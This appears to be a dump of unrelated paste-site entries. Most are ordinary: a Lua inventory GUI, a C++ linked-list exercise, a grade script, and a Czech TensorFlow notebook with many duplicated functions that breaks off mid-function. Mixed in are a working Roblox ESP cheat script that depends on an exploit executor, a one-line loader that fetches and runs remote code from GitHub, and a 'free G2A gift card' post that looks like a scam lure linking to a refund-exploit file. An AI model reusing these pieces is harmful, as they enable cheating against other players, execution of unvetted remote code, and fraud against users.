            self.data:enqueue(lines[i])
        end
        self.maxPos = math.ceil(self.data:size() / self.logTextArea.height)
        self:resetDisplay(self.currPos)
        self.logTextArea:setText(self:getDisplayTextList(function(log) return log end))
        self.logScrollBar:setMaxPos(self.maxPos)
    end,
    resetDisplay = function(self, pos)
        local display = {}
        local dataSize = self.data:size()
        for i = 1, self.logTextArea.height do
            local index = (pos - 1) * self.logTextArea.height + i
            if index > dataSize then
                break
            end
            table.insert(display, self.data:get(index))
        end
        self.currPos = pos
        self.display = display
    end,
    next = function(self)
        if self.currPos < self.maxPos then
            self:resetDisplay(self.currPos + 1)
        end
    end,
    prev = function(self)
        if self.currPos > 1 then
            self:resetDisplay(self.currPos - 1)
        end
    end,
    getDisplayTextList = function(self, extractor)
        local list = {}
        for i = 1, #self.display do
            table.insert(list, extractor(self.display[i]))
        end
        return list
    end
}

local screen = Screen:new(160, 50, COLORS.black)

-- Inventory section
local inventoryItemsSection = Section:new(""item_list_section"", 2, 1, 40, 48, ""INVETORY"", COLORS.lightGreen, COLORS.white,
    COLORS.black)
local iinventoryItemsListScrollBar = ScrollBar:new(""item_list_scroll_bar"", 36, 2, 44, COLORS.black, COLORS.lightGrey)
local inventoryItemsList = List:new(""item_list"", 4, 2, 30, 44, 22, COLORS.white, COLORS.grey)

-- left right buttons
local leftButton = Button:new(""left_button"", 44, 18, 5, 5, ""<"", COLORS.black, COLORS.lightGreen)
local rightButton = Button:new(""right_button"", 44, 24, 5, 5, "">"", COLORS.black, COLORS.pink)

-- Pull section
local pullItemListSection = Section:new(""pull_item_list_section"", 51, 1, 40, 48, ""PULL"", COLORS.pink, COLORS.white,
    COLORS.black)
local pullItemListScrollBar = ScrollBar:new(""pull_item_list_scroll_bar"", 36, 2, 44, COLORS.black, COLORS.lightGrey)
local pullList = List:new(""pull_item_list"", 4, 2, 30, 44, 22, COLORS.white, COLORS.grey)

-- log section
local logSection = Section:new(""log_section"", 94, 1, 62, 48, ""LOG"", COLORS.lightGrey, COLORS.white, COLORS.black)
local logScrollBar = ScrollBar:new(""log_scroll_bar"", 58, 2, 44, COLORS.black, COLORS.lightGrey)
local logTextArea = TextArea:new(""log_text_area"", 4, 2, 54, 44, COLORS.white, COLORS.grey)

-- add components to screen
screen:addComponent(inventoryItemsSection, 0)
screen:addComponent(pullItemListSection, 0)
screen:addComponent(leftButton, 0)
leftButton:setOnTouch(function(btn, x, y)
    local textList = {}
    local pullItems = data.pullItems
    if pullItems.selectedLabel == nil then
        return
    end
    pullItems:remove()
    for i = 1, #pullItems.displayItems do
        table.insert(textList, pullItems.displayItems[i].label)
    end
    pullList:setTextList(textList)
end)
screen:addComponent(rightButton, 0)
rightButton:setOnTouch(function(btn, x, y)
    local textList = {}
    local inventoryItems = data.inventoryItems
    local pullItems = data.pullItems
    if inventoryItems.selectedLabel == nil then
        return
    end
    pullItems:add(inventoryItems.displayItems[inventoryItems.selectedLabel.idx])
    for i = 1, #pullItems.displayItems do
        table.insert(textList, pullItems.displayItems[i].label)
    end
    pullList:setTextList(textList)
    data.inventoryItems:unselected();
end)
screen:addComponent(logSection, 0)

-- add components to itemlist section
inventoryItemsSection:addComponent(inventoryItemsList, 0)
inventoryItemsSection:addComponent(iinventoryItemsListScrollBar, 0)
inventoryItemsList:setOnTouch(function(label, x, y)
    if data.inventoryItems.selectedLabel ~= nil then
        data.inventoryItems.selectedLabel:setBackgroundColor(COLORS.grey)
    end
    data.inventoryItems.selectedLabel = label
    label:setBackgroundColor(COLORS.lightGreen)
end)

-- add components to pull itemlist section
pullItemListSection:addComponent(pullList, 0)
pullItemListSection:addComponent(pullItemListScrollBar, 0)
pullList:setOnTouch(function(label, x, y)
    if data.pullItems.selectedLabel ~= nil then
        data.pullItems.selectedLabel:setBackgroundColor(COLORS.grey)
    end
    data.pullItems.selectedLabel = label
    label:setBackgroundColor(COLORS.pink)
end)

-- add components to log section
logSection:addComponent(logTextArea, 0)
logSection:addComponent(logScrollBar, 0)
data.log.logTextArea = logTextArea
data.log.logScrollBar = logScrollBar
logScrollBar:setOnTouch(function(self, x, y)
    local status, err = pcall(function()
        local adsParentX, absParentY = self.parent:getAbsXY()
        if self:isScrollUpTouched(x, y, adsParentX, absParentY) then
            data.log:prev()
            logTextArea:setText(data.log:getDisplayTextList(function(log) return log end))
            self:scrollUp()
            logScrollBar:setMaxPos(data.log.maxPos)
        elseif self:isScrollDownTouched(x, y, adsParentX, absParentY) then
            data.log:next()
            logTextArea:setText(data.log:getDisplayTextList(function(log) return log end))
            self:scrollDown()
            logScrollBar:setMaxPos(data.log.maxPos)
        elseif self:isBarTouched(x, y, adsParentX, absParentY) then
            local pos = self:yToBarPos(y, absParentY)
            data.log:resetDisplay(pos)
            logTextArea:setText(data.log:getDisplayTextList(function(log) return log end))
            self:setCurrentPos(pos)
            logScrollBar:setMaxPos(data.log.maxPos)
        end
    end)
    if not status then
        logger:print(err)
    end
end)

screen:init()
screen:render()
loggers.setPrintFunction(function(...)
    data.log:add(...)
end)

event.timer(0.5, function()
    local status, err = pcall(function()
        data.inventoryItems:refresh()
        local labelList = {}
        for i = 1, #data.inventoryItems.displayItems do
            table.insert(labelList, data.inventoryItems.displayItems[i].label)
        end
        inventoryItemsList:setTextList(labelList)
    end)
    if not status then
        logger:print(err)
    end
end, math.huge)

event.timer(0.1, function()
    screen:render()
end, math.huge)

while event.pull(1, ""interrupted"") == nil do

end
"
XYLZmaFs,ESP,HaloJnZ,Lua,Saturday 25th of May 2024 03:21:51 PM CDT,"local function API_Check()
    if Drawing == nil then
        return ""No""
    else
        return ""Yes""
    end
end

local Find_Required = API_Check()

if Find_Required == ""No"" then
    game:GetService(""StarterGui""):SetCore(""SendNotification"",{
        Title = ""Incarcerated"";
        Text = ""ESP script could not be loaded because your exploit is unsupported."";
        Duration = math.huge;
        Button1 = ""OK""
    })

    return
end

local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local UserInputService = game:GetService(""UserInputService"")
local Camera = workspace.CurrentCamera

local Typing = false

_G.SendNotifications = true   -- If set to true then the script would notify you frequently on any changes applied and when loaded / errored. (If a game can detect this, it is recommended to set it to false)
_G.DefaultSettings = false   -- If set to true then the ESP script would run with default settings regardless of any changes you made.

_G.TeamCheck = false   -- If set to true then the script would create ESP only for the enemy team members.

_G.ESPVisible = true   -- If set to true then the ESP will be visible and vice versa.
_G.TextColor = Color3.fromRGB(255, 80, 10)   -- The color that the boxes would appear as.
_G.TextSize = 14   -- The size of the text.
_G.Center = true   -- If set to true then the script would be located at the center of the label.
_G.Outline = true   -- If set to true then the text would have an outline.
_G.OutlineColor = Color3.fromRGB(0, 0, 0)   -- The outline color of the text.
_G.TextTransparency = 0.7   -- The transparency of the text.
_G.TextFont = Drawing.Fonts.UI   -- The font of the text. (UI, System, Plex, Monospace) 

_G.DisableKey = Enum.KeyCode.Q   -- The key that disables / enables the ESP.

local function CreateESP()
    for _, v in next, Players:GetPlayers() do
        if v.Name ~= Players.LocalPlayer.Name then
            local ESP = Drawing.new(""Text"")

            RunService.RenderStepped:Connect(function()
                if workspace:FindFirstChild(v.Name) ~= nil and workspace[v.Name]:FindFirstChild(""HumanoidRootPart"") ~= nil then
                    local Vector, OnScreen = Camera:WorldToViewportPoint(workspace[v.Name]:WaitForChild(""Head"", math.huge).Position)

                    ESP.Size = _G.TextSize
                    ESP.Center = _G.Center
                    ESP.Outline = _G.Outline
                    ESP.OutlineColor = _G.OutlineColor
                    ESP.Color = _G.TextColor
                    ESP.Transparency = _G.TextTransparency
                    ESP.Font = _G.TextFont

                    if OnScreen == true then
                        local Part1 = workspace:WaitForChild(v.Name, math.huge):WaitForChild(""HumanoidRootPart"", math.huge).Position
                        local Part2 = workspace:WaitForChild(Players.LocalPlayer.Name, math.huge):WaitForChild(""HumanoidRootPart"", math.huge).Position or 0
                        local Dist = (Part1 - Part2).Magnitude
                        ESP.Position = Vector2.new(Vector.X, Vector.Y - 25)
                        ESP.Text = (""(""..tostring(math.floor(tonumber(Dist))).."") ""..v.Name.."" [""..workspace[v.Name].Humanoid.Health..""]"")
                        if _G.TeamCheck == true then 
                            if Players.LocalPlayer.Team ~= v.Team then
                                ESP.Visible = _G.ESPVisible
                            else
                                ESP.Visible = false
                            end
                        else
                            ESP.Visible = _G.ESPVisible
                        end
                    else
                        ESP.Visible = false
                    end
                else
                    ESP.Visible = false
                end
            end)

            Players.PlayerRemoving:Connect(function()
                ESP.Visible = false
            end)
        end
    end

    Players.PlayerAdded:Connect(function(Player)
        Player.CharacterAdded:Connect(function(v)
            if v.Name ~= Players.LocalPlayer.Name then 
                local ESP = Drawing.new(""Text"")
    
                RunService.RenderStepped:Connect(function()
                    if workspace:FindFirstChild(v.Name) ~= nil and workspace[v.Name]:FindFirstChild(""HumanoidRootPart"") ~= nil then
                        local Vector, OnScreen = Camera:WorldToViewportPoint(workspace[v.Name]:WaitForChild(""Head"", math.huge).Position)
    
                        ESP.Size = _G.TextSize
                        ESP.Center = _G.Center
                        ESP.Outline = _G.Outline
                        ESP.OutlineColor = _G.OutlineColor
                        ESP.Color = _G.TextColor
                        ESP.Transparency = _G.TextTransparency
    
                        if OnScreen == true then
                            local Part1 = workspace:WaitForChild(v.Name, math.huge):WaitForChild(""HumanoidRootPart"", math.huge).Position
                        local Part2 = workspace:WaitForChild(Players.LocalPlayer.Name, math.huge):WaitForChild(""HumanoidRootPart"", math.huge).Position or 0
                            local Dist = (Part1 - Part2).Magnitude
                            ESP.Position = Vector2.new(Vector.X, Vector.Y - 25)
                            ESP.Text = (""(""..tostring(math.floor(tonumber(Dist))).."") ""..v.Name.."" [""..workspace[v.Name].Humanoid.Health..""]"")
                            if _G.TeamCheck == true then 
                                if Players.LocalPlayer.Team ~= Player.Team then
                                    ESP.Visible = _G.ESPVisible
                                else
                                    ESP.Visible = false
                                end
                            else
                                ESP.Visible = _G.ESPVisible
                            end
                        else
                            ESP.Visible = false
                        end
                    else
                        ESP.Visible = false
                    end
                end)
    
                Players.PlayerRemoving:Connect(function()
                    ESP.Visible = false
                end)
            end
        end)
    end)
end

if _G.DefaultSettings == true then
    _G.TeamCheck = false
    _G.ESPVisible = true
    _G.TextColor = Color3.fromRGB(40, 90, 255)
    _G.TextSize = 14
    _G.Center = true
    _G.Outline = false
    _G.OutlineColor = Color3.fromRGB(0, 0, 0)
    _G.DisableKey = Enum.KeyCode.Q
    _G.TextTransparency = 0.75
end

UserInputService.TextBoxFocused:Connect(function()
    Typing = true
end)

UserInputService.TextBoxFocusReleased:Connect(function()
    Typing = false
end)

UserInputService.InputBegan:Connect(function(Input)
    if Input.KeyCode == _G.DisableKey and Typing == false then
        _G.ESPVisible = not _G.ESPVisible
        
        if _G.SendNotifications == true then
            game:GetService(""StarterGui""):SetCore(""SendNotification"",{
                Title = ""Incarcerated"";
                Text = ""The ESP's visibility is now set to ""..tostring(_G.ESPVisible)..""."";
                Duration = 5;
            })
        end
    end
end)

local Success, Errored = pcall(function()
    CreateESP()
end)

if Success and not Errored then
    if _G.SendNotifications == true then
        game:GetService(""StarterGui""):SetCore(""SendNotification"",{
            Title = ""Incarcerated"";
            Text = ""ESP script has successfully loaded."";
            Duration = 5;
        })
    end
elseif Errored and not Success then
    if _G.SendNotifications == true then
        game:GetService(""StarterGui""):SetCore(""SendNotification"",{
            Title = ""Incarcerated"";
            Text = ""ESP script has errored while loading, please check the developer console! (F9)"";
            Duration = 5;
        })
    end
    TestService:Message(""The ESP script has errored, please notify Exunys with the following information :"")
    warn(Errored)
    print(""!! IF THE ERROR IS A FALSE POSITIVE (says that a player cannot be found) THEN DO NOT BOTHER !!"")
end"
E2xcqSW8,СПРИНТ № 8 | Санитайзеры и другие инструменты поиска ошибок | Урок 9: Исправляем список,chevengur,C++,Saturday 25th of May 2024 02:42:34 PM CDT,"main.cpp

#include ""list.h""
#include <cassert>
#include <vector>

using namespace std;

template <class Type>
auto MakeInsertingFunction(vector<SingleLinkedList<Type>>& lists, int x) {
    return [&](const Type& value) {
        lists.at(x).PushFront(value);
        };
}

template <class T>
void InsertRange(int from, int to, T push_function) {
    for (int i = from; i < to; ++i) {
        push_function(i);
    }
}

int main() {

    vector<SingleLinkedList<int>> lists_a(10);

    auto push_to_2a = MakeInsertingFunction(lists_a, 2);
    auto push_to_5a = MakeInsertingFunction(lists_a, 5);
    auto push_to_7a = MakeInsertingFunction(lists_a, 7);

    InsertRange(10, 12, push_to_2a);
    InsertRange(12, 14, push_to_5a);
    InsertRange(14, 16, push_to_7a);

    assert(lists_a[2] == SingleLinkedList<int>({ 11, 10 }));
    assert(lists_a[5] == SingleLinkedList<int>({ 13, 12 }));
    assert(lists_a[7] == SingleLinkedList<int>({ 15, 14 }));

    vector<SingleLinkedList<int>> lists_b = lists_a;

    auto push_to_2b = MakeInsertingFunction(lists_b, 2);
    auto push_to_5b = MakeInsertingFunction(lists_b, 5);
    auto push_to_7b = MakeInsertingFunction(lists_b, 7);

    InsertRange(20, 22, push_to_2b);
    InsertRange(22, 24, push_to_5b);
    InsertRange(24, 26, push_to_7b);

    assert(lists_b[2] == SingleLinkedList<int>({ 21, 20, 11, 10 }));
    assert(lists_b[5] == SingleLinkedList<int>({ 23, 22, 13, 12 }));
    assert(lists_b[7] == SingleLinkedList<int>({ 25, 24, 15, 14 }));

    lists_a[2].PopFront();
    lists_a[5].InsertAfter(lists_a[5].begin(), 100);
    lists_b[5].EraseAfter(next(lists_b[5].begin()));
    lists_b[7].Clear();

    assert(lists_a[2] == SingleLinkedList<int>({ 10 }));
    assert(lists_a[5] == SingleLinkedList<int>({ 13, 100, 12 }));
    assert(lists_b[5] == SingleLinkedList<int>({ 23, 22, 12 }));
    assert(lists_b[7] == SingleLinkedList<int>());
}

==================================================================================================================================
list.h

#pragma once
 
#include <cassert>
#include <cstddef>
#include <iterator>
 
template <typename Type>
class SingleLinkedList {
 
    struct Node {
        Node() = default;
        Node(const Type& val, Node* next) : value(val), next_node(next) {}
        Type value{};
        Node* next_node = nullptr;
    };
 
 
    template <typename ValueType>
    class BasicIterator {
 
        friend class SingleLinkedList;
 
        explicit BasicIterator(Node* node) : node_(node) {}
 
    public:
 
        using iterator_category = std::forward_iterator_tag;
        using value_type = Type;
        using difference_type = std::ptrdiff_t;
        using pointer = ValueType*;
        using reference = ValueType&;
 
        BasicIterator() = default;
 
        BasicIterator(const BasicIterator<Type>& other) noexcept : node_(other.node_) {}
 
        BasicIterator& operator=(const BasicIterator& rhs) = default;
 
        [[nodiscard]] bool operator==(const BasicIterator<const Type>& rhs) const noexcept {
            return this->node_ == rhs.node_;
        }
 
        [[nodiscard]] bool operator==(const BasicIterator<Type>& rhs) const noexcept {
            return this->node_ == rhs.node_;
        }
        
        [[nodiscard]] bool operator!=(const BasicIterator<const Type>& rhs) const noexcept {
            return node_ != rhs.node_;
        }
 
        [[nodiscard]] bool operator!=(const BasicIterator<Type>& rhs) const noexcept {
            return node_ != rhs.node_;
        }
 
        BasicIterator& operator++() noexcept {
            assert(node_ != nullptr);
            node_ = node_->next_node;
            return *this;
        }
 
        BasicIterator operator++(int) noexcept {
            auto this_copy(*this);
            ++(*this);
            return this_copy;
        }
 
        [[nodiscard]] reference operator*() const noexcept {
            assert(node_ != nullptr);
            return node_->value;
        }
 
        [[nodiscard]] pointer operator->() const noexcept {
            assert(node_ != nullptr);
            return &node_->value;
        }
 
    private:
        Node* node_ = nullptr;
    };
 
public:
    using value_type = Type;
    using reference = value_type&;
    using const_reference = const value_type&;
 
    using Iterator = BasicIterator<Type>;
    using ConstIterator = BasicIterator<const Type>;
 
    SingleLinkedList() = default;
 
    SingleLinkedList(std::initializer_list<Type> values) {
        Assign(values.begin(), values.end());
    }
    
    SingleLinkedList(const SingleLinkedList& val) {
        Assign(val.begin(), val.end());
    }
    
    SingleLinkedList& operator=(const SingleLinkedList& helper) {
        if (&helper != this) {
            if(!helper.IsEmpty()){
                auto helper_copy(helper);
                swap(helper_copy);
            }else{
                Clear();
            }
        }
        return *this;
    }
 
    ~SingleLinkedList() {
        Clear();
    }
 
    [[nodiscard]] Iterator begin() noexcept {
        return Iterator{head_.next_node};
    }
 
    [[nodiscard]] Iterator end() noexcept {
        return Iterator{nullptr};
    }
 
    [[nodiscard]] ConstIterator begin() const noexcept {
        return cbegin();
    }
 
    [[nodiscard]] ConstIterator end() const noexcept {
        return ConstIterator{nullptr};
    }
 
    [[nodiscard]] ConstIterator cbegin() const noexcept {
        return ConstIterator{head_.next_node};
    }
 
    [[nodiscard]] ConstIterator cend() const noexcept {
        return ConstIterator{nullptr};
    }
 
    [[nodiscard]] Iterator before_begin() noexcept {
        return Iterator{&head_};
    }
 
    [[nodiscard]] ConstIterator cbefore_begin() const noexcept {
        return ConstIterator{const_cast<Node*>(&head_)};
    }
 
    [[nodiscard]] ConstIterator before_begin() const noexcept {
        return cbefore_begin();
    }
 
    [[nodiscard]] size_t GetSize() const noexcept {
        return size_;
    }
 
    [[nodiscard]] bool IsEmpty() const noexcept {
        return GetSize() == 0;
    }
 
    void PushFront(const Type& value) {
        head_.next_node = new Node(value, head_.next_node);
 
        ++size_;
    }
 
    Iterator InsertAfter(ConstIterator pos, const Type& value) {
        assert(pos.node_);
 
        pos.node_->next_node = new Node(value, pos.node_->next_node);
 
        ++size_;
        return Iterator{pos.node_->next_node};
    }
 
    void PopFront() noexcept {
        assert(!IsEmpty());
        --size_;
        Node* helper = head_.next_node->next_node;
        delete head_.next_node;
        head_.next_node = helper;
    }
 
    Iterator EraseAfter(ConstIterator pos) noexcept {
        assert(!IsEmpty()); 
        --size_;
        Node* helper = pos.node_->next_node->next_node;
        delete pos.node_->next_node;
        pos.node_->next_node = helper;
        return Iterator{pos.node_->next_node};
    }
 
    void Clear() noexcept {
 
        while (head_.next_node != nullptr) {
            Node* new_head = head_.next_node->next_node;
            delete head_.next_node;
            head_.next_node = new_head;
        }
        size_ = 0;
    }
 
    void swap(SingleLinkedList& other) noexcept {
        std::swap(head_.next_node, other.head_.next_node);
        std::swap(size_, other.size_);
    }
 
private:
    template <typename InputIterator>
    void Assign(InputIterator from, InputIterator to) {
 
        SingleLinkedList<Type> tmp;
 
        Node** node_ptr = &tmp.head_.next_node;
        while (from != to) {
 
            assert(*node_ptr == nullptr);
 
            *node_ptr = new Node(*from, nullptr);
            ++tmp.size_;
 
 
            node_ptr = &((*node_ptr)->next_node);
 
            ++from;
        }
        swap(tmp);
    }
 
    Node head_;
    size_t size_ = 0;
};
 
template <typename Type>
void swap(SingleLinkedList<Type>& lhs, SingleLinkedList<Type>& rhs) noexcept {
    lhs.swap(rhs);
}
 
template <typename Type>
bool operator==(const SingleLinkedList<Type>& lhs, const SingleLinkedList<Type>& rhs) {
    return (&lhs == &rhs)
        || (lhs.GetSize() == rhs.GetSize()
            && std::equal(lhs.begin(), lhs.end(), rhs.begin()));
}
 
template <typename Type>
bool operator!=(const SingleLinkedList<Type>& lhs, const SingleLinkedList<Type>& rhs) {
    return !(lhs == rhs);
}
 
template <typename Type>
bool operator<(const SingleLinkedList<Type>& lhs, const SingleLinkedList<Type>& rhs) {
    return std::lexicographical_compare(lhs.begin(), lhs.end(), rhs.begin(), rhs.end());
}
 
template <typename Type>
bool operator<=(const SingleLinkedList<Type>& lhs, const SingleLinkedList<Type>& rhs) {
    return !(rhs < lhs);
}
 
template <typename Type>
bool operator>(const SingleLinkedList<Type>& lhs, const SingleLinkedList<Type>& rhs) {
    return (rhs < lhs);
}
 
template <typename Type>
bool operator>=(const SingleLinkedList<Type>& lhs, const SingleLinkedList<Type>& rhs) {
    return !(lhs < rhs);
}"
EPux2ZRf,🎉G2A.com Free Gift Card Guide May 2024 FIX🚀,FeasModz514,Python,Saturday 25th of May 2024 02:19:49 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_4318174.pdf

Working as of:

25 May 2024"
YneAYDZZ,ExoticHub | SBBYGRG,DeanYTGaming8304,Lua,Saturday 25th of May 2024 02:18:10 PM CDT,loadstring(game:HttpGet('https://raw.githubusercontent.com/DExploitz/ExoticHub/main/SBBYGRG'))()
8e1gRHj4,média...,Rnery,Python,Saturday 25th of May 2024 02:07:51 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-

grades = []

# Obtendo as notas do usuário
try:
    for i in range(4):
        grade = float(input(f""Digite a {i+1}ª nota: ""))
        if grade < 0 or grade > 10:
            raise ValueError(""A nota deve estar entre 0 e 10."")
        grades.append(grade)
except ValueError as e:
    print(f""Entrada inválida: {e}"")
    exit()

# Dividindo as notas por 2 e imprimindo os resultados
print(""Notas divididas por 2:"")
for i, grade in enumerate(grades, 1):
    half_grade = grade / 2
    print(f""{i}ª nota: {half_grade}"")
"
g3WdyH0J,create_imageN jen jednou BLACK OK GOOD VK,max2201111,Python,Saturday 25th of May 2024 02:07:23 PM CDT,"#Navod na pouziti, Mgr. Hynek Mlčoušek, v Brne 2.5.2024
#Ulozte do lokalniho souboru u sebe na PC data tohoto tvaru vzdy ukoncene 0 ci 1 (jde o uceni s ucitelem: 1 = nemocny, 0 = prezil/zdravy, ve vystupu bude zelena znacit 0, cervena 1)  a bez znaku #; pozor na "",""

# [ [23.657800719276743,18.859916797201468,0],
# [22.573729142097473,17.96922325097786,0],
# [32.55342396968757,29.463651408558803,0],
# [6.718035041529263,25.704665468161718,1],
# [14.401918566243225,16.770856492924658,0],
# [17.457907312962234,21.76521470574044,0],
# [20.02796946568093,73.45445954770891,1],
# [30.295138369778076,62.901112886193246,1],
# [15.128977804449633,32.40267702110393,0],
# [30.179457395820013,58.982492125646104,1],
# [28.01649701854089,63.92781357637711,1],
# [16.791838457871147,42.33482314089884,0],
# [10.583694293380976,19.61926728942497,0],
# [26.634447074406467,91.96624817360987,1],
# [26.217868623367643,36.400293587062976,0],
# [17.689396788624936,60.79797114006423,1],
# [33.17193822527976,66.75277364959176,1],
# [23.793952755709153,22.57501437360518,0]]

#kliknete na cerne tlacitko s trojuhelnickem vlevo nahore
#pod kodem se objevi moznost spustit dialogove okenko, kliknete na nej
#soubor, ktery mate z bodu vyse vyberte a nahrajte
#Najdete v tomto kodu retezec:
###ZDE VLOZTE DATA OD NOVYCH PACIENTU

#Vlozte do pole
# new_persons_results = []
# data o nekolika malo novych pacientech bez ukoncovaci 0 a 1, ale se stejnym poctem sloupcu jako ma soubor z Vaseho lokalniho disku, vyse by tedy toto bylo rovno 2
#kod vyhodi hned po natrenovani, (jehoz prubeh muzete sledovat na modre progres bare) pro kazdy radek z new_persons_results bilo-sedo-cerne ctverecky vznikle z normalizace poskytnutych dat a ukoncovaci ctverecek cerveny pripadne zeleny
#zaroven s tim se vypise realne cislo mezi 0 a 1 znacici jak moc je pacient zdravy (blizke 0) ci nemocny (blizke 1)
#cisla uprostred pak indikuji zadany oranzovy semafor.
#je na lekarich nastavit tresholdy (tedy pravdepodobnosti: cisla mezi 0 a 1) ktere pak daji zaver, zda je pacient cerveny, oranzovy ci zeleny

# prosim o komnetare a vysledky na realnych datech, je zadouci aby radku v matici, tedy pacientu byly stovky a sloupcu desitky
# Moznosti vyuziti: onkologicka diagnoza vs. zdrava kontorlni skupina, diabetes (pritomnost/nepritomnost), testovani noveho leku oproti placebu atd.

#kod zaroven vyhodi confusion matici, tedy mozne True Negative a False Positive plus spravne zarazene hodnoty spolu s presnosti,F1 score recall atd.
#poznamka ke kodu: jde o epxerimentalni verzi, ktera krome skutecne potrebneho kodu obsahuje ladici informace, ruzne duplicity, nadbytecne prikazy atd.
# Na uvod behu programu se pro kontorlu vypise poskytnuta matice a jeji normalizovana verze, je treba sjet jezdcem napravo nize na obrazky a dalsi vystupy

#Dekuji profesoru Petru Dostalovi za namet k teto praci a poskytnuta data, byt je potreba mit data realna

import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from tqdm import tqdm


from IPython.display import display
from IPython.display import Javascript
display(Javascript('IPython.OutputArea.auto_scroll_threshold = 9999;'))

label_colors = {0: [0, 128, 0], 1: [255, 0, 0]}
label_colors_testing = {0: [0, 128, 0], 1: [255, 0, 0]}


%matplotlib inline



# Function to create images based on predictions
def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Create a gradient based on the normalized values
        gradient_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
        image[i, -1] = np.array([gradient_value] * 3)

    return image

def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use red for class 0 and green for class 1
        if predictions[i] == 0:
            image[i, -1] = np.array([255, 0, 0])  # Red
        elif predictions[i] == 1:
            image[i, -1] = np.array([0, 128, 0])  # Green

    return image

def create_image(data, predictions, label_colors):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        image[i, -1] = label_colors[predictions[i]]

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data), np.max(data)], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [np.min(data), np.max(data)], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns - 1):  # Exclude the last column for now
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data[i][j], [np.min(data[:, j]), np.max(data[:, j])], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image


def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    data_array = np.array(data)  # Convert data to a NumPy array

    for i in range(num_rows):
        for j in range(num_columns - 1):  # Exclude the last column for now
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    data_array = np.array(data)  # Convert data to a NumPy array

    for i in range(num_rows):
        for j in range(num_columns - 1):  # Exclude the last column for now
            # Map data values to the full range of 0 to 255
            pixel_value = int(np.interp(data_array[i, j], [np.min(data_array[:, j]), np.max(data_array[:, j])], [0, 255]))
            image[i, j] = np.array([pixel_value] * 3)

        # Use the specified color for the last column based on the label
        if label_colors is not None:
            image[i, -1] = label_colors[predictions[i]]
        else:
            # If label_colors is not provided, set the last column to grayscale
            pixel_value = int(np.interp(predictions[i], [0, 1], [0, 255]))
            image[i, -1] = np.array([pixel_value] * 3)

    # Now, normalize the last column separately to achieve grayscale
    min_pixel_value = np.min(image[:, -1])
    max_pixel_value = np.max(image[:, -1])
    for i in range(num_rows):
        pixel_value = int(np.interp(image[i, -1], [min_pixel_value, max_pixel_value], [0, 255]))
        image[i, -1] = np.array([pixel_value] * 3)

    return image

def create_imageN(data, predictions, label_colors=None):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
            # Map data values to the full range of 0 to 255
